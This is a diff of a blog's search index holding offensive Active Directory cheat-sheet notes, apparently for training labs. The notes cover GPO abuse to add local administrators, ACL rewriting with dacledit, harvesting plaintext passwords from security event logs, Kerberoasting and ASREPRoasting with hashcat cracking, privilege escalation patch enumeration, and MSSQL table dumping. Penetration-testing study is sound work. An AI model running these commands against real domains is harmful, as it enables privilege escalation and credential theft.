-<h3 id="Group-Policy-Object-GPO"><a href="#Group-Policy-Object-GPO" class="headerlink" title="Group Policy Object ( GPO )"></a>Group Policy Object ( GPO )</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Hackndo/pyGPOAbuse.git</span><br><span class="line"></span><br><span class="line">uv add --script pygpoabuse.py -r requirements.txt</span><br><span class="line"></span><br><span class="line">uv run --script pygpoabuse.py domain/our-user:password -gpo-id &lt;id&gt; -command &#x27;net localgroup administrators our-user /add&#x27; -f</span><br></pre></td></tr></table></figure>
-
-<p><code>➜ We can get the gpo id via output of Bloodhound</code></p>
-<h3 id="Organization-Unit"><a href="#Organization-Unit" class="headerlink" title="Organization Unit"></a>Organization Unit</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -inheritance -principal our-user -target-dn <span class="string">&#x27;Organization-Unit&#x27;</span> domain/our-user:password</span><br></pre></td></tr></table></figure>
-
-<p>With Kerberos </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action write -rights <span class="string">&#x27;FullControl&#x27;</span> -inheritance -principal our-user -target-dn <span class="string">&#x27;Organization-Unit&#x27;</span> domain/our-user:password -dc-ip dc -k</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>ACLs</category>
-      </categories>
-      <tags>
-        <tag>Certipy</tag>
-        <tag>netexec</tag>
-        <tag>dacledit</tag>
-        <tag>owneredit</tag>
-        <tag>bloodyAD</tag>
-        <tag>secretsdump</tag>
-        <tag>PowerView</tag>
-        <tag>net</tag>
       </tags>
   </entry>
   <entry>
@@ -1165,36 +1165,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Event Log Readers</title>
-    <url>/2026/03/06/Event-Log-Readers/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ Event Log Readers is a Windows group that allows its members to read system and security event logs. These logs may contain details about executed programs and command-line arguments, which can sometimes expose sensitive information such as usernames and passwords.</p>
-</blockquote>
-<h4 id="Searching-Security-Logs-with-wevtutil"><a href="#Searching-Security-Logs-with-wevtutil" class="headerlink" title="Searching Security Logs with wevtutil"></a>Searching Security Logs with <code>wevtutil</code></h4><blockquote>
-<p>➜ The <code>wevtutil</code> utility can be used to query the Security event log and search for commands that contain user credentials :</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; wevtutil qe Security /<span class="built_in">rd</span>:true /f:text | <span class="built_in">Select-String</span> <span class="string">&quot;/user&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">Process</span> Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Searching-Security-Logs-with-Get-WinEvent"><a href="#Searching-Security-Logs-with-Get-WinEvent" class="headerlink" title="Searching Security Logs with Get-WinEvent"></a>Searching Security Logs with <code>Get-WinEvent</code></h4><blockquote>
-<p>➜ Process creation events are recorded under <code>Event ID 4688 (A new process has been created)</code>. Filtering for this event ID can help identify commands that include user credentials.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; <span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> security | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="number">4688</span> <span class="operator">-and</span> <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value <span class="operator">-like</span> <span class="string">&#x27;*/user*&#x27;</span>&#125;</span><br><span class="line"> | <span class="built_in">Select-Object</span> <span class="selector-tag">@</span>&#123;name=<span class="string">&#x27;CommandLine&#x27;</span>;expression=&#123; <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value &#125;&#125;</span><br><span class="line"></span><br><span class="line">CommandLine</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
-        <category>Groups</category>
-      </categories>
-      <tags>
-        <tag>wevtutil</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Enumerating &amp; Retrieving Password Policies</title>
     <url>/2025/12/03/Enumerating-Retrieving-Password-Policies/</url>
     <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="Using-Valid-Domain-Credential"><a href="#Using-Valid-Domain-Credential" class="headerlink" title="Using Valid Domain Credential"></a>Using Valid Domain Credential</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
@@ -1225,6 +1195,36 @@
         <tag>rpcclient</tag>
         <tag>ldapsearch</tag>
         <tag>enum4linux-ng</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Event Log Readers</title>
+    <url>/2026/03/06/Event-Log-Readers/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ Event Log Readers is a Windows group that allows its members to read system and security event logs. These logs may contain details about executed programs and command-line arguments, which can sometimes expose sensitive information such as usernames and passwords.</p>
+</blockquote>
+<h4 id="Searching-Security-Logs-with-wevtutil"><a href="#Searching-Security-Logs-with-wevtutil" class="headerlink" title="Searching Security Logs with wevtutil"></a>Searching Security Logs with <code>wevtutil</code></h4><blockquote>
+<p>➜ The <code>wevtutil</code> utility can be used to query the Security event log and search for commands that contain user credentials :</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; wevtutil qe Security /<span class="built_in">rd</span>:true /f:text | <span class="built_in">Select-String</span> <span class="string">&quot;/user&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">Process</span> Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Searching-Security-Logs-with-Get-WinEvent"><a href="#Searching-Security-Logs-with-Get-WinEvent" class="headerlink" title="Searching Security Logs with Get-WinEvent"></a>Searching Security Logs with <code>Get-WinEvent</code></h4><blockquote>
+<p>➜ Process creation events are recorded under <code>Event ID 4688 (A new process has been created)</code>. Filtering for this event ID can help identify commands that include user credentials.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; <span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> security | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="number">4688</span> <span class="operator">-and</span> <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value <span class="operator">-like</span> <span class="string">&#x27;*/user*&#x27;</span>&#125;</span><br><span class="line"> | <span class="built_in">Select-Object</span> <span class="selector-tag">@</span>&#123;name=<span class="string">&#x27;CommandLine&#x27;</span>;expression=&#123; <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value &#125;&#125;</span><br><span class="line"></span><br><span class="line">CommandLine</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Groups</category>
+      </categories>
+      <tags>
+        <tag>wevtutil</tag>
       </tags>
   </entry>
   <entry>
@@ -1392,6 +1392,41 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
+    <title>Kerberoasting &amp; ASREPRoasting</title>
+    <url>/2026/01/06/Kerberoasting-ASREPRoasting/</url>
+    <content><![CDATA[<h2 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h2><p>kerbrute</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br></pre></td></tr></table></figure>
+
+<p>GetNPUsers</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetNPUsers domain/ -dc-ip dc-ip -no-pass -usersfile users.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Cracking Ticket Offline</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><blockquote>
+<p>Requesting TGS Ticket For Specific Account : </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request-user username -outputfile username</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Requesting all TGS Tickets : </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Cracking Ticket Offline</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>Kerberoasting &amp; ASREPRoasting</category>
+      </categories>
+      <tags>
+        <tag>impacket-GetNPUsers</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux Credential Hunting</title>
     <url>/2025/11/27/Linux-Credential-Hunting/</url>
     <content><![CDATA[<h1 id="Linux-Credential-Hunting"><a href="#Linux-Credential-Hunting" class="headerlink" title="Linux Credential Hunting"></a>Linux Credential Hunting</h1><h3 id="Enumerating-history-files"><a href="#Enumerating-history-files" class="headerlink" title="Enumerating history files"></a>Enumerating history files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n10 /home/*/.bash*</span><br></pre></td></tr></table></figure>
@@ -1427,98 +1462,6 @@
         <tag>history-file</tag>
         <tag>db-files</tag>
         <tag>cronjobs-enumeration</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Legacy OS</title>
-    <url>/2026/06/26/Legacy-OS/</url>
-    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><blockquote>
-<p>Enumerate the installed Windows updates.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic qfe list brief</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-HotFix</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows Exploit Suggester"></a>Windows Exploit Suggester</h3><blockquote>
-<p>Save the system information for offline analysis.</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">systeminfo &gt; sysinfo.txt</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Transfer the systeminfo output to our machine and analyze it with <code>windows-exploit-suggester</code></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python windows-exploit-suggester.py --update</span><br><span class="line"></span><br><span class="line">python windows-exploit-suggester.py --database &lt;database&gt;.xlsx --systeminfo sysinfo.txt</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Watson"><a href="#Watson" class="headerlink" title="Watson"></a>Watson</h3><blockquote>
-<p>Run Watson to identify missing privilege escalation patches on modern Windows systems.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\Watson.exe</span><br></pre></td></tr></table></figure>
-
-<h3 id="Sherlock"><a href="#Sherlock" class="headerlink" title="Sherlock"></a>Sherlock</h3><blockquote>
-<p>Run Sherlock to identify missing privilege escalation patches on legacy Windows systems.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\Sherlock.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Find-AllVulns</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Metasploit-Local-Exploit-Suggester"><a href="#Metasploit-Local-Exploit-Suggester" class="headerlink" title="Metasploit Local Exploit Suggester"></a>Metasploit Local Exploit Suggester</h3><blockquote>
-<p>If we have a Meterpreter session we can enumerate applicable local privilege escalation exploits.</p>
-</blockquote>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">msf6 &gt; set SESSION &lt;id&gt;</span><br><span class="line"></span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
-        <category>Old Systems</category>
-      </categories>
-      <tags>
-        <tag>Windows</tag>
-        <tag>Privilege-Escalation</tag>
-        <tag>CVE</tag>
-        <tag>Legacy-Systems</tag>
-        <tag>Watson</tag>
-        <tag>Sherlock</tag>
-        <tag>Windows-Exploit-Suggester</tag>
-        <tag>Metasploit</tag>
-        <tag>Patch-Enumeration</tag>
-        <tag>Local-Exploit-Suggester</tag>
-        <tag>Windows-Updates</tag>
-        <tag>HotFix</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kerberoasting &amp; ASREPRoasting</title>
-    <url>/2026/01/06/Kerberoasting-ASREPRoasting/</url>
-    <content><![CDATA[<h2 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h2><p>kerbrute</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br></pre></td></tr></table></figure>
-
-<p>GetNPUsers</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetNPUsers domain/ -dc-ip dc-ip -no-pass -usersfile users.txt</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Cracking Ticket Offline</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><blockquote>
-<p>Requesting TGS Ticket For Specific Account : </p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request-user username -outputfile username</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Requesting all TGS Tickets : </p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Cracking Ticket Offline</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>Kerberoasting &amp; ASREPRoasting</category>
-      </categories>
-      <tags>
-        <tag>impacket-GetNPUsers</tag>
       </tags>
   </entry>
   <entry>
@@ -1586,6 +1529,63 @@
         <tag>evil-winrm</tag>
         <tag>impacket-psexec</tag>
         <tag>xfreerdp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Legacy OS</title>
+    <url>/2026/06/26/Legacy-OS/</url>
+    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><blockquote>
+<p>Enumerate the installed Windows updates.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic qfe list brief</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-HotFix</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows Exploit Suggester"></a>Windows Exploit Suggester</h3><blockquote>
+<p>Save the system information for offline analysis.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">systeminfo &gt; sysinfo.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Transfer the systeminfo output to our machine and analyze it with <code>windows-exploit-suggester</code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python windows-exploit-suggester.py --update</span><br><span class="line"></span><br><span class="line">python windows-exploit-suggester.py --database &lt;database&gt;.xlsx --systeminfo sysinfo.txt</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Watson"><a href="#Watson" class="headerlink" title="Watson"></a>Watson</h3><blockquote>
+<p>Run Watson to identify missing privilege escalation patches on modern Windows systems.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\Watson.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="Sherlock"><a href="#Sherlock" class="headerlink" title="Sherlock"></a>Sherlock</h3><blockquote>
+<p>Run Sherlock to identify missing privilege escalation patches on legacy Windows systems.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\Sherlock.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Find-AllVulns</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Metasploit-Local-Exploit-Suggester"><a href="#Metasploit-Local-Exploit-Suggester" class="headerlink" title="Metasploit Local Exploit Suggester"></a>Metasploit Local Exploit Suggester</h3><blockquote>
+<p>If we have a Meterpreter session we can enumerate applicable local privilege escalation exploits.</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">msf6 &gt; set SESSION &lt;id&gt;</span><br><span class="line"></span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Old Systems</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>Privilege-Escalation</tag>
+        <tag>CVE</tag>
+        <tag>Legacy-Systems</tag>
+        <tag>Watson</tag>
+        <tag>Sherlock</tag>
+        <tag>Windows-Exploit-Suggester</tag>
+        <tag>Metasploit</tag>
+        <tag>Patch-Enumeration</tag>
+        <tag>Local-Exploit-Suggester</tag>
+        <tag>Windows-Updates</tag>
+        <tag>HotFix</tag>
       </tags>
   </entry>
   <entry>
@@ -1694,61 +1694,6 @@
         <tag>Weak-ACL</tag>
         <tag>AccessChk</tag>
         <tag>icacls</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mssql Enumeration</title>
-    <url>/2025/11/20/Mssql-Enumeration/</url>
-    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
-<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
-
-<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
-
-<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Service-Enumeration</category>
-        <category>MSSQL</category>
-      </categories>
-      <tags>
-        <tag>Enumeration</tag>
-        <tag>MSSQL</tag>
       </tags>
   </entry>
   <entry>
@@ -1865,6 +1810,61 @@
       <tags>
         <tag>Enumeration</tag>
         <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mssql Enumeration</title>
+    <url>/2025/11/20/Mssql-Enumeration/</url>
+    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
+
+
